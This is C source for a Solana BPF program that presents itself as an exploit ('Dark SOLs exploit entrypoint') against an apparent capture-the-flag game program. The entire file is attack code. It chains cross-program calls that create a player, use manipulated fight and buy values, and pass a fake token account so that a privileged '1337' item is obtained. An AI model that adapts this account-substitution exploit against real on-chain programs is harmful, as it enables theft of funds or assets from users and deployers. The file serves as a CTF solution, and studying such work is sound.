/**
 * @brief C-based Helloworld BPF program
 */
#include <solana_sdk.h>
#include "../shared/clock.h"
#include "../shared/program.h"

#define CREATE_OPCODE 0
#define DEPOSIT_OPCODE 1
#define WITHDRAW_OPCODE 2
#define BOOK_OPCODE 3
#define SLEEP_OPCODE 4

#define CLOCK 0
#define SYSTEM 1
#define TOKEN 2
#define MINT 3
#define SOLVE_ITEM 4
#define MINT_1337 5
#define SOLVE_ITEM_1337 6
#define AUTHORITY 7
#define USER 8
#define HOLDER 9
#define RENT 10
#define PLAYER 11
#define VAULT 12
#define PROGRAM 13
#define ITEM 14
#define WEAPONS 15
#define SOLVE 16
#define ITEM_1337 17

#define VAULT_SEED 0
#define SOLVE_ITEM_SEED 1
#define SOLVE_ITEM_1337_SEED 2
#define AUTHORITY_SEED 3
#define PLAYER_SEED 4
#define WEAPON_SEED 5


typedef struct {
    uint32_t opcode;
    uint8_t vault_seed;
    uint8_t authority_seed;
    uint8_t player_seed;
    uint8_t solve_item_seed;
    uint8_t solve_item_1337_seed;
    uint8_t name[31];
} CreatePlayerInstr;

typedef struct {
    uint32_t opcode;
    uint8_t vault_seed;
    uint8_t authority_seed;
    uint8_t amount;
} BuyInstr;

typedef struct {
    uint32_t opcode;
    uint8_t vault_seed;
    uint8_t authority_seed;
    uint8_t amount;
} SellInstr;

typedef struct {
    uint32_t opcode;
    uint8_t vault_seed;
    uint8_t number;
    uint8_t monster;
} FightInstr;


void create_player(SolParameters *params) {
    SolAccountInfo *clock = &params->ka[CLOCK];
    SolAccountInfo *system = &params->ka[SYSTEM];
    SolAccountInfo *token = &params->ka[TOKEN];
    SolAccountInfo *mint = &params->ka[MINT];
    SolAccountInfo *solve_item = &params->ka[SOLVE_ITEM];
    SolAccountInfo *mint_1337 = &params->ka[MINT_1337];
    SolAccountInfo *solve_item_1337 = &params->ka[SOLVE_ITEM_1337];
    SolAccountInfo *authority = &params->ka[AUTHORITY];
    SolAccountInfo *user = &params->ka[USER];
    SolAccountInfo *holder = &params->ka[HOLDER];
    SolAccountInfo *rent = &params->ka[RENT];
    SolAccountInfo *player = &params->ka[PLAYER];
    SolAccountInfo *vault = &params->ka[VAULT];
    SolAccountInfo *program = &params->ka[PROGRAM];
    SolAccountInfo *item = &params->ka[ITEM];
    SolAccountInfo *weapons = &params->ka[WEAPONS];

    uint8_t vault_seed              = params->data[VAULT_SEED];
    uint8_t solve_item_seed         = params->data[SOLVE_ITEM_SEED];
    uint8_t solve_item_1337_seed    = params->data[SOLVE_ITEM_1337_SEED];
    uint8_t authority_seed          = params->data[AUTHORITY_SEED];
    uint8_t player_seed             = params->data[PLAYER_SEED];
    uint8_t weapon_seed             = params->data[WEAPON_SEED];

    SolAccountMeta arguments[] = {
        { .pubkey = clock->key, .is_writable = false, .is_signer = false},
        { .pubkey = system->key, .is_writable = false, .is_signer = false},
        { .pubkey = token->key, .is_writable = false, .is_signer = false},
        { .pubkey = mint->key, .is_writable = true, .is_signer = false},
        { .pubkey = solve_item->key, .is_writable = true, .is_signer = false},
        { .pubkey = mint_1337->key, .is_writable = true, .is_signer = false},
        { .pubkey = solve_item_1337->key, .is_writable = true, .is_signer = false},
        { .pubkey = authority->key, .is_writable = true, .is_signer = false},
        { .pubkey = user->key, .is_writable = true, .is_signer = true},
        { .pubkey = holder->key, .is_writable = true, .is_signer = false},
        { .pubkey = rent->key, .is_writable = false, .is_signer = false},
        { .pubkey = player->key, .is_writable = true, .is_signer = false},
        { .pubkey = vault->key, .is_writable = true, .is_signer = false},
        { .pubkey = weapons->key, .is_writable = true, .is_signer = false},
    };

    CreatePlayerInstr ix_bytes = {
        .opcode = 3,
        .vault_seed = vault_seed,
        .solve_item_seed = solve_item_seed,
        .solve_item_1337_seed = solve_item_1337_seed,
        .authority_seed = authority_seed,
        .player_seed = player_seed,
    };
    uint8_t* buffer = (uint8_t*)params->data + 8;
    sol_memset(ix_bytes.name, 0, 31);
    sol_memcpy(ix_bytes.name, buffer, 30);

    const SolInstruction instruction = {
        .program_id = program->key,
        .accounts = arguments,
        .account_len = SOL_ARRAY_SIZE(arguments),
        .data = (uint8_t*)&ix_bytes,
        .data_len = sizeof(ix_bytes)
    };

    sol_invoke(
        &instruction,
        params->ka,
        params->ka_num
    );
}

void buy(SolParameters *params, uint8_t amount) {
    SolAccountInfo *clock = &params->ka[CLOCK];
    SolAccountInfo *system = &params->ka[SYSTEM];
    SolAccountInfo *token = &params->ka[TOKEN];
    SolAccountInfo *mint = &params->ka[MINT];
    SolAccountInfo *solve_item = &params->ka[SOLVE_ITEM];
    SolAccountInfo *solve_item_1337 = &params->ka[SOLVE_ITEM_1337];
    SolAccountInfo *authority = &params->ka[AUTHORITY];
    SolAccountInfo *user = &params->ka[USER];
    SolAccountInfo *holder = &params->ka[HOLDER];
    SolAccountInfo *rent = &params->ka[RENT];
    SolAccountInfo *player = &params->ka[PLAYER];
    SolAccountInfo *vault = &params->ka[VAULT];
    SolAccountInfo *program = &params->ka[PROGRAM];
    SolAccountInfo *item = &params->ka[ITEM];
    SolAccountInfo *weapons = &params->ka[WEAPONS];

    uint8_t vault_seed              = params->data[VAULT_SEED];
    uint8_t solve_item_seed         = params->data[SOLVE_ITEM_SEED];
    uint8_t solve_item_1337_seed    = params->data[SOLVE_ITEM_1337_SEED];
    uint8_t authority_seed          = params->data[AUTHORITY_SEED];
    uint8_t player_seed             = params->data[PLAYER_SEED];
    uint8_t weapon_seed             = params->data[WEAPON_SEED];
    
    SolAccountMeta arguments[] = {
        { .pubkey = clock->key, .is_writable = false, .is_signer = false},
        { .pubkey = system->key, .is_writable = false, .is_signer = false},
        { .pubkey = token->key, .is_writable = false, .is_signer = false},
        { .pubkey = mint->key, .is_writable = true, .is_signer = false},
        { .pubkey = item->key, .is_writable = true, .is_signer = false},
        { .pubkey = solve_item->key, .is_writable = true, .is_signer = false},
        { .pubkey = authority->key, .is_writable = true, .is_signer = false},
        { .pubkey = user->key, .is_writable = true, .is_signer = true},
        { .pubkey = holder->key, .is_writable = true, .is_signer = false},
        { .pubkey = vault->key, .is_writable = true, .is_signer = false},
        { .pubkey = player->key, .is_writable = true, .is_signer = false},
        { .pubkey = weapons->key, .is_writable = true, .is_signer = false},
    };

    BuyInstr ix_bytes = {
        .opcode = 2,
        .vault_seed = vault_seed,
        .authority_seed = authority_seed,
        .amount = amount,
    };

    const SolInstruction instruction = {
        .program_id = program->key,
        .accounts = arguments,
        .account_len = SOL_ARRAY_SIZE(arguments),
        .data = (uint8_t*)&ix_bytes,
        .data_len = sizeof(ix_bytes)
    };

    sol_invoke(
        &instruction,
        params->ka,
        params->ka_num
    );
}

void sell(SolParameters *params, uint8_t amount) {
    SolAccountInfo *clock = &params->ka[CLOCK];
    SolAccountInfo *system = &params->ka[SYSTEM];
    SolAccountInfo *token = &params->ka[TOKEN];
    SolAccountInfo *mint = &params->ka[MINT];
    SolAccountInfo *solve_item = &params->ka[SOLVE_ITEM];
    SolAccountInfo *solve_item_1337 = &params->ka[SOLVE_ITEM_1337];
    SolAccountInfo *authority = &params->ka[AUTHORITY];
    SolAccountInfo *user = &params->ka[USER];
    SolAccountInfo *holder = &params->ka[HOLDER];
    SolAccountInfo *rent = &params->ka[RENT];
    SolAccountInfo *player = &params->ka[PLAYER];
    SolAccountInfo *vault = &params->ka[VAULT];
    SolAccountInfo *program = &params->ka[PROGRAM];
    SolAccountInfo *item = &params->ka[ITEM];
    SolAccountInfo *weapons = &params->ka[WEAPONS];

    uint8_t vault_seed              = params->data[VAULT_SEED];
    uint8_t solve_item_seed         = params->data[SOLVE_ITEM_SEED];
    uint8_t solve_item_1337_seed    = params->data[SOLVE_ITEM_1337_SEED];
    uint8_t authority_seed          = params->data[AUTHORITY_SEED];
    uint8_t player_seed             = params->data[PLAYER_SEED];
    uint8_t weapon_seed             = params->data[WEAPON_SEED];
    
    SolAccountMeta arguments[] = {
        { .pubkey = clock->key, .is_writable = false, .is_signer = false},
        { .pubkey = system->key, .is_writable = false, .is_signer = false},
        { .pubkey = token->key, .is_writable = false, .is_signer = false},
        { .pubkey = mint->key, .is_writable = true, .is_signer = false},
        { .pubkey = item->key, .is_writable = true, .is_signer = false},
        { .pubkey = solve_item->key, .is_writable = true, .is_signer = false},
        { .pubkey = authority->key, .is_writable = true, .is_signer = false},
        { .pubkey = user->key, .is_writable = true, .is_signer = true},
        { .pubkey = holder->key, .is_writable = true, .is_signer = false},
        { .pubkey = vault->key, .is_writable = true, .is_signer = false},
        { .pubkey = player->key, .is_writable = true, .is_signer = false},
        { .pubkey = weapons->key, .is_writable = true, .is_signer = false},
    };

    transfer_amount_sys data = { .lamports = 1 };
    SellInstr ix_bytes = {
        .opcode = 1,
        .vault_seed = vault_seed,
        .authority_seed = authority_seed,
        .amount = amount
    };

    const SolInstruction instruction = {
        .program_id = program->key,
        .accounts = arguments,
        .account_len = SOL_ARRAY_SIZE(arguments),
        .data = (uint8_t*)&ix_bytes,
        .data_len = sizeof(ix_bytes)
    };

    sol_invoke(
        &instruction,
        params->ka,
        params->ka_num
    );
}

void fight(SolParameters *params, uint8_t number, uint8_t monster, uint8_t weapon) {
    SolAccountInfo *clock = &params->ka[CLOCK];
    SolAccountInfo *system = &params->ka[SYSTEM];
    SolAccountInfo *token = &params->ka[TOKEN];
    SolAccountInfo *mint = &params->ka[MINT];
    SolAccountInfo *solve_item = &params->ka[SOLVE_ITEM];
    SolAccountInfo *solve_item_1337 = &params->ka[SOLVE_ITEM_1337];
    SolAccountInfo *authority = &params->ka[AUTHORITY];
    SolAccountInfo *user = &params->ka[USER];
    SolAccountInfo *holder = &params->ka[HOLDER];
    SolAccountInfo *rent = &params->ka[RENT];
    SolAccountInfo *player = &params->ka[PLAYER];
    SolAccountInfo *vault = &params->ka[VAULT];
    SolAccountInfo *program = &params->ka[PROGRAM];
    SolAccountInfo *item = &params->ka[ITEM];
    SolAccountInfo *weapons = &params->ka[WEAPONS];

    uint8_t vault_seed              = params->data[VAULT_SEED];
    uint8_t solve_item_seed         = params->data[SOLVE_ITEM_SEED];
    uint8_t solve_item_1337_seed    = params->data[SOLVE_ITEM_1337_SEED];
    uint8_t authority_seed          = params->data[AUTHORITY_SEED];
    uint8_t player_seed             = params->data[PLAYER_SEED];
    uint8_t weapon_seed             = params->data[WEAPON_SEED];

    SolAccountInfo* weapon_item = solve_item;
    if (weapon == 1)
        weapon_item = solve_item_1337;
    
    SolAccountMeta arguments[] = {
        { .pubkey = clock->key, .is_writable = false, .is_signer = false},
        { .pubkey = system->key, .is_writable = false, .is_signer = false},
        { .pubkey = token->key, .is_writable = false, .is_signer = false},
        { .pubkey = weapon_item->key, .is_writable = true, .is_signer = false},
        { .pubkey = authority->key, .is_writable = true, .is_signer = false},
        { .pubkey = user->key, .is_writable = true, .is_signer = true},
        { .pubkey = holder->key, .is_writable = true, .is_signer = false},
        { .pubkey = vault->key, .is_writable = true, .is_signer = false},
        { .pubkey = player->key, .is_writable = true, .is_signer = false},
        { .pubkey = weapons->key, .is_writable = true, .is_signer = false},
    };
    
    transfer_amount_sys data = { .lamports = 1 };
    FightInstr ix_bytes = {
        .opcode = 4,
        .vault_seed = vault_seed,
        .number = number,
        .monster = monster
    };

    const SolInstruction instruction = {
        .program_id = program->key,
        .accounts = arguments,
        .account_len = SOL_ARRAY_SIZE(arguments),
        .data = (uint8_t*)&ix_bytes,
        .data_len = sizeof(ix_bytes)
    };

    sol_invoke(
        &instruction,
        params->ka,
        params->ka_num
    );
}

void fake_token(SolParameters* params) {
    SolAccountInfo *clock = &params->ka[CLOCK];
    SolAccountInfo *system = &params->ka[SYSTEM];
    SolAccountInfo *token = &params->ka[TOKEN];
    SolAccountInfo *mint = &params->ka[MINT];
    SolAccountInfo *solve_item = &params->ka[SOLVE_ITEM];
    SolAccountInfo *solve_item_1337 = &params->ka[SOLVE_ITEM_1337];
    SolAccountInfo *authority = &params->ka[AUTHORITY];
    SolAccountInfo *user = &params->ka[USER];
    SolAccountInfo *holder = &params->ka[HOLDER];
    SolAccountInfo *rent = &params->ka[RENT];
    SolAccountInfo *player = &params->ka[PLAYER];
    SolAccountInfo *vault = &params->ka[VAULT];
    SolAccountInfo *program = &params->ka[PROGRAM];
    SolAccountInfo *item = &params->ka[ITEM];
    SolAccountInfo *weapons = &params->ka[WEAPONS];
    SolAccountInfo *solve = &params->ka[SOLVE];
    SolAccountInfo *item_1337 = &params->ka[ITEM_1337];

    uint8_t vault_seed              = params->data[VAULT_SEED];
    uint8_t solve_item_seed         = params->data[SOLVE_ITEM_SEED];
    uint8_t solve_item_1337_seed    = params->data[SOLVE_ITEM_1337_SEED];
    uint8_t authority_seed          = params->data[AUTHORITY_SEED];
    uint8_t player_seed             = params->data[PLAYER_SEED];
    uint8_t weapon_seed             = params->data[WEAPON_SEED];
    
    SolAccountMeta arguments[] = {
        { .pubkey = clock->key, .is_writable = false, .is_signer = false},
        { .pubkey = system->key, .is_writable = false, .is_signer = false},
        { .pubkey = solve->key, .is_writable = false, .is_signer = false},
        { .pubkey = token->key, .is_writable = false, .is_signer = false},
        { .pubkey = item_1337->key, .is_writable = true, .is_signer = false},
        { .pubkey = solve_item_1337->key, .is_writable = true, .is_signer = false},
        { .pubkey = authority->key, .is_writable = true, .is_signer = false},
        { .pubkey = user->key, .is_writable = true, .is_signer = true},
        { .pubkey = player->key, .is_writable = true, .is_signer = false},
        { .pubkey = vault->key, .is_writable = true, .is_signer = false},
        { .pubkey = player->key, .is_writable = true, .is_signer = false},
        { .pubkey = weapons->key, .is_writable = true, .is_signer = false},
    };

    BuyInstr ix_bytes = {
        .opcode = 1,
        .vault_seed = vault_seed,
        .authority_seed = authority_seed,
        .amount = 1,
    };

    const SolInstruction instruction = {
        .program_id = program->key,
        .accounts = arguments,
        .account_len = SOL_ARRAY_SIZE(arguments),
        .data = (uint8_t*)&ix_bytes,
        .data_len = sizeof(ix_bytes)
    };

    sol_invoke(
        &instruction,
        params->ka,
        params->ka_num
    );
}

uint64_t solve(SolParameters *params) {
    uint8_t health = params->data[6];
    uint8_t mana = params->data[7];
    create_player(params);
    fight(params, 1, 6, 0);
    health -= 64;
    mana--;
    fight(params, health, 0, 0);
    buy(params, 10);
    fight(params, mana - health, 0, 0);
    fake_token(params);
    fight(params, 1, 8, 1);
    return SUCCESS;
}

extern uint64_t entrypoint(const uint8_t *input) {
    sol_log("Dark SOLs exploit entrypoint");

    SolAccountInfo accounts[20];
    SolParameters params = (SolParameters){.ka = accounts};

    if (!sol_deserialize(input, &params, SOL_ARRAY_SIZE(accounts))) {
        return ERROR_INVALID_ARGUMENT;
    }

    return solve(&params);
}
